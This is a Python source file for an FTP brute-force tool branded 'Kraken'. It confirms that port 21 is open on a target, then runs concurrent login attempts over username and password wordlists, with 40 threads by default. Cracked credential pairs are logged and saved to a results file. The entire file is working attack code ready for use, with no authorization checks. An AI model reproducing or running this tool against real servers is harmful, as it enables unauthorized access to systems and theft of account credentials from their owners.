import os
import sys
import time
import socket
from ftplib import FTP
import gevent
from gevent import monkey
from gevent.pool import Pool
from colorama import Fore, Style

monkey.patch_all()

from core.ui import clear_console, display_banner, status, success, error, info
from core.utils import load_file_lines
from core.logger import setup_logger

script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')
os.makedirs(results_dir, exist_ok=True)

logger = setup_logger(os.path.join(logs_dir, 'ftp_brute_force.log'))

def check_ftp_port(target):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)
            return sock.connect_ex((target, 21)) == 0
    except socket.gaierror as e:
        logger.error(f"Network error: {e}")
        return False

def login_attempt(ip, username, password, attempt_number, total_attempts, start_time, result_file):
    def format_output(succeeded):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts) if attempt_number > 0 else 0
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        s = "Success" if succeeded else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} | Current: {username}:{password} {s}"

    try:
        with FTP() as ftp:
            ftp.connect(ip, timeout=5)
            ftp.login(user=username, passwd=password)
            sys.stdout.write('\033[K')
            success_msg = format_output(True)
            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
            logger.info(success_msg.strip())
            result_file.write(success_msg.strip() + "\n")
            result_file.flush()
            return success_msg
    except Exception as e:
        sys.stdout.write('\033[K')
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logger.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
        return None

def execute_brute(ip, usernames, passwords, threads):
    total_attempts = len(usernames) * len(passwords)
    start_time = time.time()
    
    # Needs to be a list containing an integer so it can be modified in a nested func
    attempt_counter = [0]
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "ftp_results.txt")
    with open(result_file_path, "a") as result_file:
        def handle_result(username, password):
            attempt_counter[0] += 1
            result = login_attempt(ip, username, password, attempt_counter[0], total_attempts, start_time, result_file)
            if result:
                results.append(result)

        try:
            for username in usernames:
                for password in passwords:
                    pool.spawn(handle_result, username, password)
            pool.join()
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Script interrupted by user. Shutting down threads...")
            os._exit(0)

    logger.info("Brute force process completed.")

def run(target, users_file, username, passwords_file, threads):
    clear_console()
    display_banner("Kraken FTP Brute-Force")
    info("\n" + "="*80 + "\n")

    if not check_ftp_port(target):
        error('FTP port 21 is not open. Check the target IP or server status.')
        sys.exit(1)

    usernames = []
    if users_file:
        usernames = load_file_lines(users_file)
    elif username:
        usernames = [username]
    else:
        error('You must specify either a users list or a single username.')
        sys.exit(1)
    
    passwords = load_file_lines(passwords_file)
    if not passwords:
        error(f'Password list {passwords_file} is empty or missing.')
        sys.exit(1)
        
    execute_brute(target, usernames, passwords, threads)

def run_interactive():
    clear_console()
    display_banner("Kraken FTP Brute-Force")
    
    print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
    target_ip = input(Fore.WHITE + "Enter the FTP server IP address: ").strip()

    if check_ftp_port(target_ip):
        use_list = input(Fore.WHITE + "Use a username list? (Y/n): ").strip().upper() != 'N'
        if use_list:
            user_file_default = os.path.join(script_dir, "..", "wordlists", "users.txt")
            user_file = input(Fore.WHITE + f"Enter path to username list (default: users.txt): ").strip() or user_file_default
            users = load_file_lines(user_file)
        else:
            users = [input(Fore.WHITE + 'Enter single username: ').strip()]

        pwd_file_default = os.path.join(script_dir, "..", "wordlists", "passwords.txt")
        pwd_file = input(Fore.WHITE + f"Enter path to password list (default: passwords.txt): ").strip() or pwd_file_default
        pwds = load_file_lines(pwd_file)

        threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)
        
        if not users or not pwds:
            error("Error: The username or password list is empty or could not be found.")
            sys.exit(1)

        info("\n" + "="*80 + "\n")
        execute_brute(target_ip, users, pwds, threads)
    else:
        error('FTP port 21 is not open. Check the target IP or server status.')
        sys.exit(1)

if __name__ == "__main__":
    try:
        run_interactive()
    except KeyboardInterrupt:
        logger.info("Script interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
